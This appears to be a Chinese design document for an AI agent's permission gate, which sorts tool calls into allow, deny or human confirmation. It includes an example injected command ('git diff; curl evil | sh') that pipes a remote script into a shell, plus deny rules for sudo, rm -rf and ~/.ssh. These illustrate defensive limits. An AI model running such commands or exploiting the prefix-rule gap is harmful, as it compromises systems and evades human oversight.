# permissions — 权限网关

## 职责

`packages/core/src/permissions/engine.ts` 的 `ConfigPermissionGate` 在每个工具调用执行前给出三档判定之一：`allow`（直接执行）、`deny`（拒绝并把原因回传模型）、`confirm`（交给人工确认）。判定完全由配置规则 + 工具声明的 risk 元数据 + 会话工作目录驱动，**自身不做任何交互**——确认的等待、超时、事件广播在循环层（`packages/core/src/agent/loop.ts`），人工裁决的接收在服务端（`packages/server/src/confirm.ts`）。

---

## 设计决策

- **三档输出、顺序短路**：判定链每一步都可能直接返回，后续不再看。顺序为 deny 黑名单 → allow 白名单 → 工作目录越界检查 → safeTools → 会话级授权 → confirm。deny 永远最先：一条命中黑名单的调用无论白名单如何配置都不会执行。
- **规则是扁平字符串，不是结构化对象**：`"exec:git *"` 这类前缀通配规则写在 `config.yaml` 里，人和模型都可读可写；编译只做一次切分，匹配用无正则的回溯算法。
- **匹配对象按工具提取**：exec 匹配命令字符串、写文件工具匹配路径、其余工具匹配整个参数的 JSON 文本——规则作用于"该调用要执行的动作"，而不是原始参数对象。
- **路径规则双向匹配**：规则同时按原始形态和规范化形态（`~` 展开 + 相对工作目录解析）测试，同一文件以不同写法（`~/.ssh/x` / `.ssh/x` / `/Users/u/.ssh/x`）均不能绕过 deny。
- **越界访问必须过人**：文件工具的目标一旦离开会话工作目录，即使工具本身是 safe（如 fs_read）也转为 confirm——"只读"不能作为读取任意系统文件的许可。
- **gate 与确认流程解耦**：gate 只签发 `conf_` 前缀的确认 id；发事件、计时、超时自动拒绝都归循环，broker 仅负责登记与裁决。两侧职责不重叠，事件也不会重复。

---

## 接口

```ts
// 判定结果（定义在 packages/core/src/agent/loop.ts，gate 实现它）
export type PermissionDecision =
  | { type: "allow"; reason: "safe" | "whitelist" | "session_grant" }
  | { type: "deny"; reason: "blacklist" | "user_denied" | "timeout"; noteText: string }
  | { type: "confirm"; confirmationId: string }

export interface PermissionGate {
  check(toolCall: ToolCallBlock): Promise<PermissionDecision>  // 缺失 == 全放行
}

// packages/core/src/permissions/engine.ts
export interface CompiledRule { tool: string; argGlob?: string }
export function compileRule(s: string): CompiledRule
export function globMatch(pattern: string, s: string): boolean
export function extractArg(name: string, args: unknown): string

export class SessionGrants {
  grant(rule: string): void
  hasMatch(tool: string, arg: string, workspace?: string): boolean
  size(): number
}

export class ConfigPermissionGate implements PermissionGate {
  constructor(cfg: KclawConfig["permissions"], opts?: {
    safeTools?: Set<string>        // 可自动放行的工具名集合
    grants?: SessionGrants         // 仅当 config 开启 sessionGrants 时被查询
    newConfirmationId?: () => string
    workspace?: string             // 会话工作目录，越界判定与路径规范化用它
  })
  check(toolCall: ToolCallBlock): Promise<PermissionDecision>
}
```

配置来源（`packages/core/src/storage/config.ts`）：

```yaml
permissions:
  allow: []                          # 默认空
  deny: ["exec:sudo*", "exec:rm -rf*"]
  confirmTimeoutMs: 120000           # 确认等待上限，默认 120s
  sessionGrants: true
```

---

## 核心流程

### 1. 规则语法与匹配

`compileRule` 在**第一个冒号**处切分：`exec:git *` → `{tool: "exec", argGlob: "git *"}`（argGlob 自身可以含冒号）；裸字符串 `exec` 是工具级规则，不看参数。

`globMatch` 的语义：`*` 是唯一通配符，匹配任意字符序列**包括 `/`**（所以不需要 `**` 特例）；大小写敏感；实现是迭代式星号回溯，不编译正则。`exec:git *` 命中 `git diff`、`git status`，也命中 `git diff; curl evil | sh`（见"边界"）。

`extractArg` 决定规则比对哪段字符串：

| 工具 | 匹配对象 |
|------|----------|
| `exec` | `args.command`（命令字符串） |
| `fs_write` / `fs_edit` | `args.path` |
| 其它（含 fs_read/fs_list） | `JSON.stringify(args)` 整体 |

### 2. 判定链（`check` 的短路顺序）

```
① deny 规则命中        → deny {reason:"blacklist", noteText:"规则命中黑名单: <原规则>"}
② allow 规则命中       → allow {reason:"whitelist"}
③ 越界检查（文件工具）  → confirm（见下，即使工具是 safe）
④ safeTools 含该工具    → allow {reason:"safe"}
⑤ sessionGrants 开启且授权命中 → allow {reason:"session_grant"}
⑥ 以上全不中            → confirm，签发新 conf_ id
```

### 3. 路径规范化匹配（防拼写绕过）

对 `fs_write`/`fs_edit`（引擎内 `PATH_TOOLS` 集合），规则命中判定依次测三步，前一步不中才走下一步：

1. 按原始参数串直接测。
2. 参数转成规范化形态——`~`/`~/` 展开为家目录、再 `path.resolve(workspace, p)` 解析成绝对路径（与 fs 工具实际写文件前的解析完全一致）——用规范化后的 arg 对原始 glob 测一次。
3. 把 **glob 本身也规范化**后再测一次。

结果：deny `fs_write:~/.ssh/**` 同时拦截 `~/.ssh/x`、`.ssh/x`（workspace 为家目录时）、`/Users/u/.ssh/x`、`~/./.ssh/x`——它们解析到同一个文件。

### 4. 会话工作目录边界

`FILE_TOOLS = {fs_read, fs_list, fs_write, fs_edit}` 的 `path` 参数做越界判定：按上面的方式展开解析后，`resolved` 既不等于工作目录根、也不以 `根 + 路径分隔符` 开头，即视为越界 → **直接 confirm**。要点：

- 位置在 deny/allow **之后**：黑名单与白名单的优先级更高，先判完才轮到边界。
- safe 工具不豁免：fs_read/fs_list 越界同样要人确认。
- 工作目录本身允许（`resolved === root`，如对根目录 fs_list）。
- 工作目录未设置时不做该检查（legacy 行为）；daemon 侧的取值是会话元数据的 `workdir`，缺省回退 `config.workspace`（`packages/server/src/run.ts`）。

exec 没有可判定的"目标路径"——命令可以以任何方式访问文件系统，所以对 exec **没有越界精确判定**，处理策略是：命中 deny/allow 之外的一律 confirm，由人工审视命令本身。

### 5. 敏感工具清单怎么定

引擎不硬编码清单。daemon 装配（`packages/server/src/run.ts`）把 `createBuiltinTools` 产物里 `risk === "safe"` 的执行器名收集为 `safeTools` 传入 gate。按当前 9 个内置工具的声明（见 [tools](./tools.md)）：

- **safe（命中即自动放行）**：`fs_read`、`fs_list`、`web_search`、`web_fetch`、`memory_save`、`memory_search`——共 6 个，全是不改工作目录状态的 parallel 工具；
- **sensitive（无 allow 规则命中必然 confirm）**：`exec`、`fs_write`、`fs_edit`——共 3 个。注意 fs_read/fs_list 虽是 safe，目标越界时仍进入 confirm（第 4 步）。

### 6. 人工确认流程

```
gate 签发 confirmationId（newId("conf")，前缀 + 单调 ULID——按时间递增、可排序的唯一 ID）
  → 循环发 confirmation.requested {confirmationId, toolCall, risk, expiresAt = 现在+confirmTimeoutMs}
  → 三方竞速等待（raceConfirmation）：人工裁决 | confirmTimeoutMs 超时 | run 取消信号
      ├ 批准   → grantedBy = "confirmed"，照常执行
      ├ 拒绝   → error result "用户拒绝了该操作" + note 块 kind "denied"
      ├ 超时   → error result "确认超时，操作未执行" + note 块 kind "timeout"
      └ 取消   → 不发 confirmation.resolved；工具得 "run aborted before execution"，run 以 aborted 收尾
  → 循环发 confirmation.resolved {confirmationId, approved, by}
```

- 超时默认 `confirmTimeoutMs = 120_000`（config 默认值与循环的内置默认值一致，均为 120 秒）。
- 服务端 `ConfirmationBroker`（`packages/server/src/confirm.ts`）：
  - 登记：RunManager 包装 gate，confirm 判定一出就在 broker 登记（携带 toolCall、risk、会话 id）。
  - 裁决：CLI/Web 经 WS `confirmation.resolve` 帧调 `broker.resolve(id, approved, by)`（`by` 默认 `"cli"`）。
  - broker **不发事件、不设内部超时**——事件归循环，计时归循环与 RunManager 的同一竞速机制；两处用同一超时值竞速保证视图一致。
  - 超时/取消后 RunManager 调 `expire` 把条目标记失效，迟到的裁决只会收到 unknown confirmation，不会确认一个已无人等待的动作。
- deny 的 `user_denied` / `timeout` 两个 reason 不是 gate 产出的：gate 只产生 `blacklist` 拒绝，前两者是循环把人工拒绝/超时转成 error result 时的语义标记（note 块的 `kind`）。

### 7. grantedBy 记录

每个被放行的调用都会把原因记在 tool 消息上：`ToolMessage.grantedBy: Record<callId, GrantedBy>`（`packages/core/src/protocol/messages.ts`，`GrantedBy = "safe" | "whitelist" | "session_grant" | "confirmed"`）。这是完整的执行审计链——事后可逐调用追溯"这次执行的授权来源"。Web 端审计视图（`packages/web/src/audit/AuditView.tsx`）就按 callId 反查该字段渲染批注。

### 8. 会话级授权（SessionGrants）

`SessionGrants` 是进程内存里的授权存储：人工确认某规则后 `grant(rule)` 存入编译后的规则，同一会话内相同调用不再重复询问。生效需要两个条件同时成立：`config.permissions.sessionGrants === true` **且**宿主在构造 gate 时传入 `grants` 存储。当前 daemon 装配只传 `{workspace, safeTools}`，未传 grants——引擎与测试就绪，daemon 侧尚未接线，此分支暂不生效。

---

## 边界与出错

- **deny 不防 shell 注入**：exec 的规则匹配的是命令字符串本身，`exec:git diff*` 同样命中 `git diff; curl evil | sh`。白名单只应放前缀可信的命令；真正的防线是默认的 confirm 档——人工可查看完整命令。
- **规则大小写敏感**，`*` 之外无其它通配符（`?`、`[]` 都是字面字符）。
- **SessionGrants 是进程内存**：daemon 重启即清空；且历史 grantedBy 记录不受影响（那是持久化在会话日志里的）。
- **gate 缺失 = 全放行**：循环对未注入 `permissions` 的调用一律 `{type:"allow", reason:"safe"}`——组装宿主时漏配权限网关等于没有权限检查，daemon 装配始终注入。
- **越界检查依赖 workspace 正确**：会话 `workdir` 决定了越界判定的边界；创建会话时不传 workdir 则落到 `config.workspace`（daemon 启动目录的默认值是进程当前目录）。

---

## 关联

- [agent-loop](./agent-loop.md)：确认的竞速等待、note 块与 grantedBy 的写入现场
- [tools](./tools.md)：risk/concurrency 元数据的来源与 9 个工具清单
- [../server/run-manager.md](../server/run-manager.md)：gate + broker 的 daemon 侧装配
- [../server/realtime.md](../server/realtime.md)：confirmation.resolve 帧的 WS 入口
